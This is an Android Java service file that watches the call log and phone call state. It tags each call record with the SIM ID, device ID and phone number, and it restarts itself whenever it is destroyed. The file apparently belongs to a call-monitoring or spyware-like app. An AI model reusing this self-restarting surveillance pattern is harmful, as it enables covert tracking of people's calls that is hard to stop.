package com.privacy.system.service;

import com.privacy.system.base.C;
import com.privacy.system.domain.CallRecord;
import com.privacy.system.inte.RunBack;
import com.privacy.system.listener.MyPhoneStateListener;
import com.privacy.system.resolver.CallObserver;
import com.privacy.system.resolver.field.CallConstant;
import com.privacy.system.resolver.handler.CallHandler;
import com.privacy.system.util.Logger;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

/**
 * 通话记录监听服务
 */
public class CallMonitoringService extends Service {

	private static final String TAG = CallMonitoringService.class.getSimpleName();
    private CallObserver callObserver;
    
    @Override
    public IBinder onBind(Intent intent) {
            return null;
    }

    @Override
    public void onCreate() {
           Logger.d(TAG, "通话监听服务启动了");
           ContentResolver callResolver = getContentResolver();
           callObserver = new CallObserver(callResolver,new CallHandler(getApplicationContext()),new MyRunnBack());
           callResolver.registerContentObserver(CallConstant.CONTENT_URI,true,callObserver);
           
           TelephonyManager mTelephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
           mTelephonyManager.listen(new MyPhoneStateListener(this),PhoneStateListener.LISTEN_CALL_STATE);
    }
    

    @Override
    public void onDestroy() {
            Logger.d(TAG,"call服务销毁");
            Intent intent = new Intent(getApplicationContext(),CallMonitoringService.class);
            startService(intent);
            
            if(callObserver !=null){
            	getContentResolver().unregisterContentObserver(callObserver);
            }
            super.onDestroy();
    }
    
    private class MyRunnBack implements RunBack{
    	@Override
    	public void run() {
    		
    	}

		@Override
		public void run(Object object) {
			CallRecord callRecord = (CallRecord) object;
			SharedPreferences sp = getApplicationContext().getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
			callRecord.setSimID(sp.getString(C.SIM_ID,""));
			callRecord.setDeviceID(sp.getString(C.DEVICE_ID,""));
			callRecord.setMyPhone(sp.getString(C.PHONE_NUM,""));
			
		}
    }
}
